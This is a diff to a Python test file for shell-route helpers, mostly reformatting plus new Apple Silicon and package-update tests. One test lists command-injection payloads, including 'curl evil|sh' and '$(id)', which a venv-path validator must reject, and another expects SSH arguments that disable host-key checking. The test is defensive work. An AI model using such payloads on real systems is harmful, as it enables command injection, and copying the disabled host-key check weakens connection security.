@@ -1,6 +1,7 @@
 """Tests for shell_routes.py helpers."""
 
 import builtins
+import importlib
 import importlib.util
 import json
 import os
@@ -39,7 +40,9 @@ def test_shell_routes_import_without_posix_pty_modules(monkeypatch):
     cached_modules = {name: sys.modules.pop(name, None) for name in ("fcntl", "pty")}
 
     module_path = Path(__file__).resolve().parents[1] / "routes" / "shell_routes.py"
-    spec = importlib.util.spec_from_file_location("_shell_routes_without_pty", module_path)
+    spec = importlib.util.spec_from_file_location(
+        "_shell_routes_without_pty", module_path
+    )
     module = importlib.util.module_from_spec(spec)
     sys.modules[spec.name] = module
     try:
@@ -59,7 +62,9 @@ async def test_generate_pty_reports_explicit_unsupported_error(monkeypatch):
     import routes.shell_routes as shell_routes
 
     monkeypatch.setattr(shell_routes, "PTY_SUPPORTED", False)
-    monkeypatch.setattr(shell_routes, "_PTY_IMPORT_ERROR", ImportError("No module named 'termios'"))
+    monkeypatch.setattr(
+        shell_routes, "_PTY_IMPORT_ERROR", ImportError("No module named 'termios'")
+    )
 
     request = SimpleNamespace(is_disconnected=lambda: False)
     events = [
@@ -123,29 +128,76 @@ class TestRunningInContainer:
     def test_dockerenv_marker_present(self, tmp_path):
         marker = tmp_path / ".dockerenv"
         marker.write_text("")
-        assert _running_in_container(
-            dockerenv_path=str(marker), cgroup_path=str(tmp_path / "missing"),
-        ) is True
+        assert (
+            _running_in_container(
+                dockerenv_path=str(marker),
+                cgroup_path=str(tmp_path / "missing"),
+            )
+            is True
+        )
 
     def test_cgroup_names_a_container_runtime(self, tmp_path):
         cgroup = tmp_path / "cgroup"
         cgroup.write_text("12:devices:/docker/abcdef0123456789\n")
-        assert _running_in_container(
-            dockerenv_path=str(tmp_path / "no-marker"), cgroup_path=str(cgroup),
-        ) is True
+        assert (
+            _running_in_container(
+                dockerenv_path=str(tmp_path / "no-marker"),
+                cgroup_path=str(cgroup),
+            )
+            is True
+        )
 
     def test_bare_host_has_neither_signal(self, tmp_path):
         cgroup = tmp_path / "cgroup"
         cgroup.write_text("0::/user.slice/session-1.scope\n")
-        assert _running_in_container(
-            dockerenv_path=str(tmp_path / "no-marker"), cgroup_path=str(cgroup),
-        ) is False
+        assert (
+            _running_in_container(
+                dockerenv_path=str(tmp_path / "no-marker"),
+                cgroup_path=str(cgroup),
+            )
+            is False
+        )
 
     def test_missing_cgroup_file_is_not_a_container(self, tmp_path):
-        assert _running_in_container(
-            dockerenv_path=str(tmp_path / "no-marker"),
-            cgroup_path=str(tmp_path / "also-missing"),
-        ) is False
+        assert (
+            _running_in_container(
+                dockerenv_path=str(tmp_path / "no-marker"),
+                cgroup_path=str(tmp_path / "also-missing"),
+            )
+            is False
+        )
+
+
+class TestAppleSiliconDetection:
+    """APFEL should only surface as available on native Apple Silicon Macs."""
+
+    def test_reports_true_on_macos_arm64(self, monkeypatch):
+        import core.platform_compat as platform_compat
+
+        monkeypatch.setattr(platform_compat.platform, "system", lambda: "Darwin")
+        monkeypatch.setattr(platform_compat.platform, "machine", lambda: "arm64")
+        importlib.reload(platform_compat)
+
+        assert platform_compat.IS_APPLE_SILICON is True
+
+    @pytest.mark.parametrize("machine", ["x86_64", "amd64"])
+    def test_reports_false_off_apple_silicon(self, monkeypatch, machine):
+        import core.platform_compat as platform_compat
+
+        monkeypatch.setattr(platform_compat.platform, "system", lambda: "Darwin")
+        monkeypatch.setattr(platform_compat.platform, "machine", lambda: machine)
+        importlib.reload(platform_compat)
+
+        assert platform_compat.IS_APPLE_SILICON is False
+
+    def test_reports_false_on_non_macos(self, monkeypatch):
+        import core.platform_compat as platform_compat
+
+        monkeypatch.setattr(platform_compat.platform, "system", lambda: "Linux")
+        monkeypatch.setattr(platform_compat.platform, "machine", lambda: "arm64")
+        importlib.reload(platform_compat)
+
+        assert platform_compat.IS_APPLE_SILICON is False
 
 
 class TestDockerRowStatus:
@@ -155,35 +207,50 @@ class TestDockerRowStatus:
 
     def test_in_container_and_absent_is_not_applicable_with_safe_default_hint(self):
         status = _docker_row_status(
-            on_remote=False, in_container=True, installed=False, default_hint=self.DEFAULT,
+            on_remote=False,
+            in_container=True,
+            installed=False,
+            default_hint=self.DEFAULT,
         )
         assert status.applicable is False
         assert status.install_hint == DOCKER_IN_CONTAINER_HINT
 
     def test_in_container_but_present_is_applicable_with_default_hint(self):
         status = _docker_row_status(
-            on_remote=False, in_container=True, installed=True, default_hint=self.DEFAULT,
+            on_remote=False,
+            in_container=True,
+            installed=True,
+            default_hint=self.DEFAULT,
         )
         assert status.applicable is True
         assert status.install_hint == self.DEFAULT
 
     def test_on_host_and_absent_stays_applicable_with_default_hint(self):
         status = _docker_row_status(
-            on_remote=False, in_container=False, installed=False, default_hint=self.DEFAULT,
+            on_remote=False,
+            in_container=False,
+            installed=False,
+            default_hint=self.DEFAULT,
         )
         assert status.applicable is True
         assert status.install_hint == self.DEFAULT
 
     def test_remote_server_is_always_applicable_even_when_absent(self):
         status = _docker_row_status(
-            on_remote=True, in_container=False, installed=False, default_hint=self.DEFAULT,
+            on_remote=True,
+            in_container=False,
+            installed=False,
+            default_hint=self.DEFAULT,
         )
         assert status.applicable is True
         assert status.install_hint == self.DEFAULT
 
     def test_remote_server_ignores_local_container_status(self):
         status = _docker_row_status(
-            on_remote=True, in_container=True, installed=False, default_hint=self.DEFAULT,
+            on_remote=True,
+            in_container=True,
+            installed=False,
+            default_hint=self.DEFAULT,
         )
         assert status.applicable is True
         assert status.install_hint == self.DEFAULT
@@ -226,7 +293,10 @@ class TestPackageProbeStatus:
 
         assert _package_installed_from_probe("vllm", probe) is True
         assert "python package: vllm 0.8.5" in _package_status_note("vllm", probe)
-        assert _package_pip_update_status({"name": "vllm", "pip": "vllm"}, probe).available is True
+        assert (
+            _package_pip_update_status({"name": "vllm", "pip": "vllm"}, probe).available
+            is True
+        )
 
     def test_vllm_cli_without_dist_is_external_for_update(self):
         probe = {
@@ -250,18 +320,35 @@ class TestPackageProbeStatus:
 
         assert _package_installed_from_probe("llama_cpp", probe) is True
         assert "native llama-server" in _package_status_note("llama_cpp", probe)
-        status = _package_pip_update_status({"name": "llama_cpp", "pip": "llama-cpp-python[server]"}, probe)
+        status = _package_pip_update_status(
+            {"name": "llama_cpp", "pip": "llama-cpp-python[server]"}, probe
+        )
         assert status.available is False
         assert "package manager or source checkout" in status.note
 
+    def test_apfel_does_not_use_generic_outside_odysseus_note(self):
+        status = _package_pip_update_status(
+            {"name": "APFEL", "pip": "", "update_cmd": "brew upgrade apfel"},
+            {"binaries": {}, "dists": {}, "modules": {}},
+        )
+
+        assert status.available is False
+        assert "Update this system dependency outside Odysseus." not in status.note
+
     def test_diffusers_requires_torch_too(self):
         missing_torch = {
-            "modules": {"diffusers": {"found": True, "real_module": True}, "torch": {"found": False}},
+            "modules": {
+                "diffusers": {"found": True, "real_module": True},
+                "torch": {"found": False},
+            },
             "dists": {"diffusers": "0.37.0"},
             "binaries": {},
         }
         ready = {
-            "modules": {"diffusers": {"found": True, "real_module": True}, "torch": {"found": True, "real_module": True}},
+            "modules": {
+                "diffusers": {"found": True, "real_module": True},
+                "torch": {"found": True, "real_module": True},
+            },
             "dists": {"diffusers": "0.37.0", "torch": "2.10.0"},
             "binaries": {},
         }
@@ -293,7 +380,11 @@ class TestPackageProbeStatus:
 class TestSshBaseArgv:
     def test_basic_host_no_port(self):
         assert _ssh_base_argv("user@example.com", None) == [
-            "ssh", "-o", "ConnectTimeout=6", "-o", "StrictHostKeyChecking=no",
+            "ssh",
+            "-o",
+            "ConnectTimeout=6",
+            "-o",
+            "StrictHostKeyChecking=no",
             "user@example.com",
         ]
 
@@ -329,16 +420,21 @@ class TestVenvActivatePrefix:
         assert _venv_activate_prefix("~/venv") == ". ~/venv/bin/activate && "
 
     def test_already_pointing_at_activate(self):
-        assert _venv_activate_prefix("/opt/v/bin/activate") == ". /opt/v/bin/activate && "
+        assert (
+            _venv_activate_prefix("/opt/v/bin/activate") == ". /opt/v/bin/activate && "
+        )
 
-    @pytest.mark.parametrize("bad", [
-        "/opt/v && curl evil|sh",
-        "$(id)",
-        "`id`",
-        "v;id",
-        "v\nid",
-        "v|id",
-    ])
+    @pytest.mark.parametrize(
+        "bad",
+        [
+            "/opt/v && curl evil|sh",
+            "$(id)",
+            "`id`",
+            "v;id",
+            "v\nid",
+            "v|id",
+        ],
+    )
     def test_injection_payloads_rejected(self, bad):
         with pytest.raises(ValueError):
             _venv_activate_prefix(bad)
@@ -351,6 +447,7 @@ class TestRejectCrossSite:
 
     def test_cross_site_rejected(self):
         from fastapi import HTTPException
+
         with pytest.raises(HTTPException) as exc:
             _reject_cross_site(self._req({"sec-fetch-site": "cross-site"}))
         assert exc.value.status_code == 403
